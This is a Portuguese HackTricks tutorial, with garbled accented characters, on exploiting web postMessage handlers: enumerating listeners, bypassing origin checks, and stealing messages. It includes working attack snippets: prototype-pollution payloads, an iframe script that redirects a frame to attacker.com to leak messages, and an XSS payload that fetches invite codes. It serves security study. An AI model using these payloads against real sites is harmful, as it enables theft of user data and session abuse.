# Vulnerabilidades do PostMessage

## Vulnerabilidades do PostMessage

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

## Enviar **PostMessage**

**PostMessage** usa a seguinte fun√ß√£o para enviar uma mensagem:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Note que **targetOrigin** pode ser um '\*' ou uma URL como _https://company.com._\
No **segundo cen√°rio**, a **mensagem s√≥ pode ser enviada para esse dom√≠nio** (mesmo que a origem do objeto janela seja diferente).\
Se o **coringa** for usado, **mensagens podem ser enviadas para qualquer dom√≠nio**, e ser√£o enviadas para a origem do objeto Janela.

### Atacando iframe & coringa em **targetOrigin**

Conforme explicado neste [**relat√≥rio**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/), se voc√™ encontrar uma p√°gina que pode ser **inserida em um iframe** (sem prote√ß√£o de `X-Frame-Header`) e que est√° **enviando mensagens sens√≠veis** via **postMessage** usando um **coringa** (\*), voc√™ pode **modificar** a **origem** do **iframe** e **vazar** a **mensagem sens√≠vel** para um dom√≠nio controlado por voc√™.\
Note que se a p√°gina puder ser inserida em um iframe, mas o **targetOrigin** estiver **definido como uma URL e n√£o como um coringa**, esse **truque n√£o funcionar√°**.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## Explora√ß√£o do addEventListener

O **`addEventListener`** √© a fun√ß√£o usada pelo JS para declarar a fun√ß√£o que est√° **aguardando `postMessages`**.\
Um c√≥digo semelhante ao seguinte ser√° usado:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
### Enumera√ß√£o

Para **encontrar ouvintes de eventos** na p√°gina atual, voc√™ pode:

* **Pesquisar** o c√≥digo JS por `window.addEventListener` e `$(window).on` (_vers√£o JQuery_)
* **Executar** no console das ferramentas de desenvolvedor: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1) (1).png>)

* **Ir para** _Elementos --> Ouvintes de Eventos_ nas ferramentas de desenvolvedor do navegador

![](<../../.gitbook/assets/image (617).png>)

* Usar uma **extens√£o do navegador** como [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) ou [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Essas extens√µes do navegador ir√£o **interceptar todas as mensagens** e mostr√°-las para voc√™.

### Contornos de verifica√ß√£o de origem

- O atributo **`event.isTrusted`** √© considerado seguro, pois retorna `True` apenas para eventos gerados por a√ß√µes genu√≠nas do usu√°rio. Embora seja desafiador de contornar se implementado corretamente, sua import√¢ncia em verifica√ß√µes de seguran√ßa √© not√°vel.

- O uso de **`indexOf()`** para valida√ß√£o de origem em eventos PostMessage pode ser suscet√≠vel a contornos. Um exemplo ilustrando essa vulnerabilidade √©:

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```

- O m√©todo **`search()`** de `String.prototype.search()` √© destinado a express√µes regulares, n√£o a strings. Passar qualquer coisa que n√£o seja uma express√£o regular leva √† convers√£o impl√≠cita para regex, tornando o m√©todo potencialmente inseguro. Isso ocorre porque em regex, um ponto (.) age como um caractere curinga, permitindo contornar a valida√ß√£o com dom√≠nios especialmente elaborados. Por exemplo:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- A fun√ß√£o **`match()`**, semelhante a `search()`, processa regex. Se a regex for estruturada incorretamente, ela pode ser propensa a contornos.

- A fun√ß√£o **`escapeHtml`** √© destinada a sanitizar entradas escapando caracteres. No entanto, ela n√£o cria um novo objeto escapado, mas sobrescreve as propriedades do objeto existente. Esse comportamento pode ser explorado. Especialmente, se um objeto puder ser manipulado de forma que sua propriedade controlada n√£o reconhe√ßa `hasOwnProperty`, o `escapeHtml` n√£o funcionar√° conforme o esperado. Isso √© demonstrado nos exemplos abaixo:

- Falha esperada:
```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Contornando o escape:
```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

No contexto dessa vulnerabilidade, o objeto `File` √© notavelmente explor√°vel devido √† sua propriedade `name` somente leitura. Essa propriedade, quando usada em modelos, n√£o √© sanitizada pela fun√ß√£o `escapeHtml`, levando a potenciais riscos de seguran√ßa.

- A propriedade `document.domain` em JavaScript pode ser definida por um script para encurtar o dom√≠nio, permitindo uma aplica√ß√£o mais relaxada da pol√≠tica de mesma origem dentro do mesmo dom√≠nio pai.

### Contorno de `e.origin == window.origin`

Ao incorporar uma p√°gina da web em um **iframe isolado** usando %%%<iframe sandbox="allow-scripts" src="https://example.com/iframe.php">%%%, √© crucial entender que a origem do iframe ser√° definida como `null`. Isso √© particularmente importante ao lidar com **atributos de sandbox** e suas implica√ß√µes na seguran√ßa e funcionalidade.

Ao especificar **`allow-popups`** no atributo de sandbox, qualquer janela pop-up aberta de dentro do iframe herda as restri√ß√µes de sandbox de seu pai. Isso significa que, a menos que o atributo **`allow-popups-to-escape-sandbox`** tamb√©m seja inclu√≠do, a origem da janela pop-up √© igualmente definida como `null`, alinhando-se com a origem do iframe.

Consequentemente, quando uma pop-up √© aberta nessas condi√ß√µes e uma mensagem √© enviada do iframe para a pop-up usando **`postMessage`**, tanto o envio quanto o recebimento t√™m suas origens definidas como `null`. Isso leva a um cen√°rio em que **`e.origin == window.origin`** avalia como verdadeiro (`null == null`), porque tanto o iframe quanto a pop-up compartilham o mesmo valor de origem `null`.

Para mais informa√ß√µes, **leia**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### Contornando `e.source`

√â poss√≠vel verificar se a mensagem veio da mesma janela em que o script est√° ouvindo (especialmente interessante para **Scripts de Conte√∫do de extens√µes de navegador** para verificar se a mensagem foi enviada da mesma p√°gina):
```javascript
// If it‚Äôs not, return immediately.
if( received_message.source !== window ) {
return;
}
```
Pode for√ßar **`e.source`** de uma mensagem a ser nulo criando um **iframe** que **envia** o **postMessage** e √© **imediatamente exclu√≠do**.

Para mais informa√ß√µes **leia:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### Bypass do Cabe√ßalho X-Frame

Para realizar esses ataques, idealmente voc√™ poder√° **colocar a p√°gina da web da v√≠tima** dentro de um `iframe`. Mas alguns cabe√ßalhos como `X-Frame-Header` podem **prevenir** esse **comportamento**.\
Em tais cen√°rios, ainda √© poss√≠vel usar um ataque menos furtivo. Voc√™ pode abrir uma nova aba para a aplica√ß√£o web vulner√°vel e se comunicar com ela:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Roubo de mensagem enviada para o filho bloqueando a p√°gina principal

Na p√°gina a seguir, voc√™ pode ver como poderia roubar dados **sens√≠veis de postmessage** enviados para um **iframe filho** ao **bloquear** a **p√°gina principal** antes de enviar os dados e abusar de um **XSS no filho** para **vazar os dados** antes que sejam recebidos:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### Roubo de mensagem modificando a localiza√ß√£o do iframe

Se voc√™ puder inserir um iframe em uma p√°gina da web sem o cabe√ßalho X-Frame-Options que contenha outro iframe, voc√™ pode **alterar a localiza√ß√£o desse iframe filho**, ent√£o, se estiver recebendo um **postmessage** enviado usando um **coringa**, um atacante poderia **alterar** a **origem** desse iframe para uma p√°gina **controlada** por ele e **roubar** a mensagem:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage para Polui√ß√£o de Prot√≥tipo e/ou XSS

Em cen√°rios onde os dados enviados por meio de `postMessage` s√£o executados pelo JS, voc√™ pode **inserir um iframe** na **p√°gina** e **explorar** a **polui√ß√£o de prot√≥tipo/XSS** enviando o exploit via `postMessage`.

Alguns **XSS muito bem explicados atrav√©s de `postMessage`** podem ser encontrados em [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)

Exemplo de um exploit para abusar da **Polui√ß√£o de Prot√≥tipo e depois XSS** atrav√©s de um `postMessage` para um `iframe`:
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
Para **mais informa√ß√µes**:

* Link para a p√°gina sobre [**polui√ß√£o de prot√≥tipo**](../deserialization/nodejs-proto-prototype-pollution/)
* Link para a p√°gina sobre [**XSS**](../xss-cross-site-scripting/)
* Link para a p√°gina sobre [**polui√ß√£o de prot√≥tipo do lado do cliente para XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)

## Refer√™ncias

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* Para praticar: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
